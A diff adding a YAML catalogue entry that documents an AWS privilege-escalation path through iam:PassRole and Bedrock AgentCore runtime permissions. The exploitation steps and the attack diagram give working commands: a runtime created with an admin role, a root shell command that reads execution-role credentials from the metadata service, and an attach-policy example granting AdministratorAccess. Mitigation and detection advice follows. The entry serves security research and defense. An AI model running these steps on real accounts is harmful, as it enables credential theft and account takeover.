@@ -1,0 +1,281 @@
+id: bedrock-003
+name: iam:PassRole + bedrock-agentcore:CreateAgentRuntime + bedrock-agentcore:CreateAgentRuntimeEndpoint + bedrock-agentcore:CreateWorkloadIdentity + bedrock-agentcore:InvokeAgentRuntimeCommand
+category: new-passrole
+services:
+- iam
+- bedrock-agentcore
+permissions:
+  required:
+  - permission: iam:PassRole
+    resourceConstraints: Target role ARN must be in the Resource section and the role must trust bedrock-agentcore.amazonaws.com
+  - permission: bedrock-agentcore:CreateAgentRuntime
+    resourceConstraints: Must have permission to create Bedrock AgentCore runtimes
+  - permission: bedrock-agentcore:CreateAgentRuntimeEndpoint
+    resourceConstraints: Must have permission to create the runtime endpoint used to invoke the runtime
+  - permission: bedrock-agentcore:CreateWorkloadIdentity
+    resourceConstraints: Must have permission to create the workload identity the runtime requires at creation
+  - permission: bedrock-agentcore:InvokeAgentRuntimeCommand
+    resourceConstraints: Must have permission to invoke commands on the created runtime
+  additional:
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering AgentCore execution roles available to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
+  - permission: bedrock-agentcore:GetAgentRuntime
+    resourceConstraints: Useful for confirming the new runtime reached a READY state before invoking it
+description: A principal with `iam:PassRole`, `bedrock-agentcore:CreateAgentRuntime`, `bedrock-agentcore:CreateAgentRuntimeEndpoint`, `bedrock-agentcore:CreateWorkloadIdentity` and `bedrock-agentcore:InvokeAgentRuntimeCommand` can deploy a new AgentCore Runtime with a privileged IAM execution role and then run shell commands as root inside its Firecracker microVM. `InvokeAgentRuntimeCommand` executes a submitted command as root parallel to the customer agent process, bypassing the agent, model and guardrails entirely. The command reads the execution role temporary credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS, granting the attacker the full permissions of the chosen execution role. Creating the runtime rather than targeting an existing one lets the attacker pick exactly which role to escalate to.
+prerequisites:
+  admin:
+  - A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it
+  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+  - A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: 'export AWS_REGION=[your region]
+
+      export EXECUTION_ROLE=arn:aws:iam::[account-id]:role/[role with admin privs that trusts bedrock-agentcore]
+
+      export CONTAINER_URI=[attacker-controlled ECR image URI]
+
+      which jq
+
+      '
+    description: Set up session variables and confirm jq is installed
+  - step: 2
+    command: |
+      RUNTIME_ARN=$(aws bedrock-agentcore-control create-agent-runtime \
+        --agent-runtime-name atk_runtime \
+        --role-arn $EXECUTION_ROLE \
+        --agent-runtime-artifact "{\"containerConfiguration\":{\"containerUri\":\"$CONTAINER_URI\"}}" \
+        --network-configuration '{"networkMode":"PUBLIC"}' | jq -r .agentRuntimeArn)
+    description: Create a runtime with the privileged execution role. The call provisions the DEFAULT runtime endpoint and the workload identity, which is why CreateAgentRuntimeEndpoint and CreateWorkloadIdentity are required
+  - step: 3
+    command: |
+      cat << 'EOF' > "get_creds_from_runtime.py"
+      import boto3, sys, uuid
+      client = boto3.client("bedrock-agentcore", region_name=sys.argv[2])
+
+      command = """bash -c '
+      TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
+      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
+      '"""
+
+      response = client.invoke_agent_runtime_command(
+        agentRuntimeArn=sys.argv[1],
+        runtimeSessionId=str(uuid.uuid4()),
+        body={"command": command, "timeout": 30},
+      )
+      for event in response["stream"]:
+        chunk = event["chunk"]
+        if "contentDelta" in chunk and "stdout" in chunk["contentDelta"]:
+          print(chunk["contentDelta"]["stdout"], end="")
+      EOF
+    description: Create the python file that submits a root shell command reading the execution role credentials from MMDS
+  - step: 4
+    command: 'CREDS=$(python3 get_creds_from_runtime.py $RUNTIME_ARN $AWS_REGION)
+
+      echo export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r ".AccessKeyId")
+
+      echo export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r ".SecretAccessKey")
+
+      echo export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r ".Token")
+
+      '
+    description: Run the python file using the $RUNTIME_ARN to extract the execution role credentials
+  - step: 5
+    command: 'export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>
+
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>
+
+      export AWS_SESSION_TOKEN=<Token from step 4>
+
+      aws sts get-caller-identity
+
+      '
+    description: Use the stolen credentials to act as the runtime execution role
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful. The `bedrock-agentcore:InvokeAgentRuntimeCommand` permission then runs arbitrary commands as root inside the runtime microVM, bypassing the agent, model and guardrails.
+
+  - **Avoid administrative service roles** - Very rarely does an AgentCore Runtime need administrative access. Use the principle of least privilege and start from AWS's documented runtime execution role policy.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
+  - **Constrain `bedrock-agentcore:InvokeAgentRuntimeCommand`** - Treat it as a command-execution gate equivalent to root on the microVM and deny it org-wide except for an approved allowlist.
+
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificAgentCoreRuntimeRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "bedrock-agentcore.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  Deny the command-execution permission outside an approved allowlist with an SCP:
+
+  ```json
+  {
+    "Effect": "Deny",
+    "Action": "bedrock-agentcore:InvokeAgentRuntimeCommand",
+    "Resource": "*",
+    "Condition": {
+      "ArnNotLike": {
+        "aws:PrincipalArn": "arn:aws:iam::*:role/ApprovedAgentCoreOperators"
+      }
+    }
+  }
+  ```
+
+  - Enable CloudTrail data events for the `AWS::BedrockAgentCore::Runtime` and `RuntimeEndpoint` resource types to capture `InvokeAgentRuntimeCommand`
+  - The auto-created `/aws/bedrock-agentcore/runtimes/<runtimeId>-DEFAULT` CloudWatch log group records the body of every submitted command; alert on entries that touch 169.254.169.254 or security-credentials
+  - Monitor CloudTrail for runtime creation followed by immediate invocation, and for runtimes created by principals who do not usually deploy AgentCore
+  - Monitor CloudTrail for roles being passed to bedrock-agentcore that have not been passed before
+  - Regularly audit all IAM roles that trust bedrock-agentcore.amazonaws.com and down-scope any with administrative access
+limitations: 'This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.
+
+  '
+discoveryAttribution:
+  firstDocumented:
+    author: Sergio Garcia
+    organization: BeyondTrust Phantom Labs
+    date: 2026
+    link: https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation
+references:
+- title: 'Mapping Every Privilege Escalation Path in AWS AgentCore'
+  url: https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation
+- title: Understanding Credentials Management in Amazon Bedrock AgentCore
+  url: https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html
+- title: AgentCore Runtime execution role permissions
+  url: https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-permissions.html
+relatedPaths:
+- bedrock-001
+- bedrock-004
+- bedrock-005
+- ec2-001
+- sagemaker-001
+attackVisualization:
+  nodes:
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: The principal with iam:PassRole and the bedrock-agentcore create and invoke permissions. Can be an IAM user or role. This is the attacker's initial access point.
+  - id: agent_runtime
+    label: New AgentCore Runtime
+    type: resource
+    description: A new AgentCore Runtime created with a privileged execution role. The runtime runs on a Firecracker microVM that exposes the role credentials on the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS.
+  - id: target_role
+    label: Existing Role That Trusts the bedrock-agentcore Service
+    type: principal
+    description: The IAM role passed to the runtime as its execution role. The role must trust bedrock-agentcore.amazonaws.com to assume it. AgentCore assumes the role and serves its temporary credentials on MMDS at the execution_role endpoint inside the microVM.
+  - id: method_sdk_attack
+    label: 'Method 1: Act directly from the root shell'
+    type: payload
+    color: '#99ccff'
+    description: |
+      The submitted command runs as root inside the microVM where the execution role credentials are already present in the environment, so the attacker can perform privileged actions in place without exfiltrating anything.
+
+      Example command body invoked through InvokeAgentRuntimeCommand:
+      ```bash
+      aws iam attach-user-policy \
+        --user-name attacker-user \
+        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+      ```
+  - id: method_cred_exfil
+    label: 'Method 2: Exfiltrate credentials to the response stream'
+    type: payload
+    color: '#99ccff'
+    description: |
+      The submitted command reads the execution role credentials from MMDS and prints them, and AgentCore returns the output in the response stream so the attacker can use the credentials from any location.
+
+      Example command body invoked through InvokeAgentRuntimeCommand:
+      ```bash
+      TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
+      curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
+      ```
+
+      This returns AccessKeyId, SecretAccessKey and Token, which the attacker can export and use until they expire.
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    description: The execution role has AdministratorAccess or equivalent permissions, so acting as the role or using its exfiltrated credentials gives the attacker full administrative access to the AWS account.
+  - id: some_perms
+    label: Some additional access
+    type: outcome
+    color: '#ffeb99'
+    description: The execution role has some elevated permissions but not full admin. This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths. The attacker should enumerate the role permissions to determine what was gained.
+  - id: no_access
+    label: No additional access
+    type: outcome
+    color: '#cccccc'
+    description: The execution role only has minimal permissions (e.g., logs:PutLogEvents). Limited usefulness for privilege escalation, and the attacker would target a different role.
+  edges:
+  - from: start
+    to: agent_runtime
+    label: iam:PassRole + bedrock-agentcore:CreateAgentRuntime
+    description: |
+      Create a new AgentCore Runtime and pass the target role to it as the execution role. The runtime runs on a Firecracker microVM with access to MMDS.
+
+      Command:
+      ```bash
+      aws bedrock-agentcore-control create-agent-runtime \
+        --agent-runtime-name atk_runtime \
+        --role-arn $EXECUTION_ROLE \
+        --agent-runtime-artifact '{"containerConfiguration":{"containerUri":"<attacker-ecr-uri>"}}' \
+        --network-configuration '{"networkMode":"PUBLIC"}'
+      ```
+  - from: agent_runtime
+    to: target_role
+    label: Runtime assumes the execution role
+    description: AgentCore assumes the passed execution role and serves its temporary credentials on the MicroVM Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role inside the runtime microVM.
+  - from: target_role
+    to: method_sdk_attack
+    label: Option A
+    branch: A
+    description: The attacker submits a command that uses the role credentials in place from the root shell to perform privileged actions directly.
+  - from: target_role
+    to: method_cred_exfil
+    label: Option B
+    branch: B
+    description: The attacker submits a command that reads the role credentials from MMDS and returns them in the response stream for use from any location.
+  - from: method_sdk_attack
+    to: admin
+    label: If the execution role has admin permissions
+    branch: A1
+    condition: admin
+    description: If the execution role has AdministratorAccess or equivalent, the in-place command grants the starting principal full administrative access, for example by attaching admin policies or creating admin access keys.
+  - from: method_sdk_attack
+    to: some_perms
+    label: If the execution role has some elevated permissions
+    branch: A2
+    condition: some_permissions
+    description: If the execution role has some elevated permissions, the in-place command can still grant useful additional access within the role permission scope or reach sensitive resources.
+  - from: method_sdk_attack
+    to: no_access
+    label: If the execution role has minimal permissions
+    branch: A3
+    condition: no_permissions
+    description: If the execution role only has minimal permissions, the in-place command cannot perform meaningful privilege escalation and the attacker would pass a different role.
+  - from: method_cred_exfil
+    to: admin
+    label: If the execution role has admin permissions
+    branch: B1
+    condition: admin
+    description: If the execution role has AdministratorAccess or equivalent, the exfiltrated credentials give the attacker full administrative access to the AWS account from any location.
+  - from: method_cred_exfil
+    to: some_perms
+    label: If the execution role has some elevated permissions
+    branch: B2
+    condition: some_permissions
+    description: If the execution role has some elevated permissions, the exfiltrated credentials can be used for lateral movement or additional attacks.
+  - from: method_cred_exfil
+    to: no_access
+    label: If the execution role has minimal permissions
+    branch: B3
+    condition: no_permissions
+    description: If the execution role only has minimal permissions, the exfiltrated credentials provide limited value for privilege escalation.
